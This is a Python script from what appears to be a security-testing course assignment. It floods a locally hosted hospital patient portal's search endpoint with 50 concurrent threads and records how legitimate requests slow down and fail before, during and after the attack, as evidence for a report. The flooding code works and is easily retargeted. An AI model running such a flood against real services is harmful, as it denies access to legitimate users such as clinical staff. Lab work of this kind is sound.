"""
dos_attack.py

VAPT Topic 3 (Malware/Sniffing/Social Engineering/DoS/Session
Hijacking/IDS Evasion) -- technique selected: Denial of Service.

Floods the hospital patient portal's /search endpoint with a high volume
of concurrent requests from many threads, simulating an attacker trying
to exhaust the server and deny legitimate staff access to patient
records. Measures response time and failure rate BEFORE, DURING, and
AFTER the flood, for your before/after evidence requirement.

Run against your own local app only:
    python3 app_patched.py      (in one terminal)
    python3 dos_attack.py       (in another terminal)

While this runs, open Wireshark on your loopback interface (lo /
Loopback) and start a capture before launching the attack, so you also
have a packet-level record of the flood for your report.
"""
import requests
import threading
import time
import statistics

BASE_URL = "http://127.0.0.1:5000/search"

NUM_ATTACK_THREADS = 50       # concurrent attacker "connections"
ATTACK_DURATION_SEC = 15      # how long the flood runs
BASELINE_SAMPLES = 20         # legitimate requests measured before/after

stop_flag = threading.Event()
attack_stats = {"sent": 0, "failed": 0, "lock": threading.Lock()}


def measure_legit_requests(label, n=BASELINE_SAMPLES):
    """Sends n normal staff-style search requests and reports timing."""
    times = []
    failures = 0
    for _ in range(n):
        try:
            start = time.time()
            r = requests.get(BASE_URL, params={"q": "Aarav"}, timeout=5)
            elapsed = (time.time() - start) * 1000
            if r.status_code == 200:
                times.append(elapsed)
            else:
                failures += 1
        except Exception:
            failures += 1

    print(f"\n--- {label} ---")
    if times:
        print(f"  Successful legitimate requests : {len(times)}/{n}")
        print(f"  Avg response time               : {statistics.mean(times):.1f} ms")
        print(f"  Max response time                : {max(times):.1f} ms")
    print(f"  Failed/timed-out requests        : {failures}/{n}")
    return times, failures


def attacker_thread():
    """One flooding thread: fires requests as fast as possible until stopped."""
    while not stop_flag.is_set():
        try:
            requests.get(BASE_URL, params={"q": "flood"}, timeout=2)
            with attack_stats["lock"]:
                attack_stats["sent"] += 1
        except Exception:
            with attack_stats["lock"]:
                attack_stats["failed"] += 1


def run_flood():
    print(f"\n=== LAUNCHING DOS FLOOD: {NUM_ATTACK_THREADS} threads for {ATTACK_DURATION_SEC}s ===")
    threads = [threading.Thread(target=attacker_thread) for _ in range(NUM_ATTACK_THREADS)]
    for t in threads:
        t.start()
    time.sleep(ATTACK_DURATION_SEC)
    stop_flag.set()
    for t in threads:
        t.join()
    print(f"Attack traffic sent     : {attack_stats['sent']}")
    print(f"Attack requests failed  : {attack_stats['failed']}")


if __name__ == "__main__":
    print("Hospital Patient Portal - DoS Impact Demonstration")
    print("Make sure app_patched.py (or app_vulnerable.py) is running on port 5000.")
    print("If capturing in Wireshark, start your capture on 'lo' now, before continuing.\n")
    input("Press Enter to begin BASELINE measurement...")

    measure_legit_requests("BEFORE attack (baseline)")

    input("\nPress Enter to launch the DoS flood...")
    # Run the flood and a legitimate user's requests AT THE SAME TIME,
    # to show what a real nurse/doctor experiences during the attack.
    flood_thread = threading.Thread(target=run_flood)
    flood_thread.start()
    time.sleep(2)  # let the flood ramp up first
    measure_legit_requests("DURING attack (legitimate user's experience)")
    flood_thread.join()

    print("\nWaiting 3 seconds for server to settle...")
    time.sleep(3)

    measure_legit_requests("AFTER attack (recovery)")

    print("\n=== SUMMARY ===")
    print("Compare the three blocks above: avg response time and failure")
    print("count for legitimate staff requests before, during, and after")
    print("the flood. This is your before/after impact evidence.")
